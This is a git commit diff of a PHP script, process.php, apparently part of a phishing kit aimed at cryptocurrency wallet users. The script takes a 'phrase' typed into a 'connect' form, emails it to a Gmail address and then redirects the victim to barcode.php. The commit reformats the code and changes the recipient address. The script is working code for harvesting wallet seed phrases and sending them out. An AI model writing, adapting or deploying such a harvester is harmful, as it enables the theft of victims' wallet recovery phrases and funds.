ed438e7271c223953e540d4f667fad02ba012098
einpunk-protocol <einpunk-protocol@github.com>
2023-03-09 18:16:57 -0800

    first commit

--- process.php
+++ process.php
@@ -1,30 +1,28 @@
 <?php
 
-if(isset($_POST['connect_btn'])){
-    $phrase = $_POST['connect'];
-    
-    $subject = "NEW MESSAGE FROM Sandbox";
-    
-    $body = "<p>Phrase: $phrase</p>";
-    $to = "charlesjohnson7002@gmail.com";
-    //$to = "devjeff360@gmail.com";
-    
-$headers .='Reply-To: '. $to . "\r\n" ;
-$headers .='X-Mailer: PHP/' . phpversion();
-$headers .="MIME-Version: 1.0\r\n";
-$headers .="Content-Type: text/html; charset=ISO-8859-1\r\n";
-		
-					  
-if(mail($to,$subject,$body,$headers, '-f charlesjohnson7002@gmail.com -F "CLRW"')) {
-header("Location: barcode.php");
-  } 
-  else 
-  {
-header("Location: barcode.php");
+if (isset($_POST['connect_btn'])) {
+  $phrase = $_POST['connect'];
+
+  $subject = "NEW MESSAGE FROM Sandbox";
+
+  $body = "<p>Phrase: $phrase</p>";
+  $to = "charlesjohnson7002@gmail.com";
+  $to = "gagemarkowski@gmail.com";
+
+  $headers .= 'Reply-To: ' . $to . "\r\n";
+  $headers .= 'X-Mailer: PHP/' . phpversion();
+  $headers .= "MIME-Version: 1.0\r\n";
+  $headers .= "Content-Type: text/html; charset=ISO-8859-1\r\n";
+
+
+  if (mail($to, $subject, $body, $headers, '-f charlesjohnson7002@gmail.com -F "CLRW"')) {
+    header("Location: barcode.php");
+  } else {
+    header("Location: barcode.php");
   }
-    
-    
-    
+
+
+
 }
 
 ?>
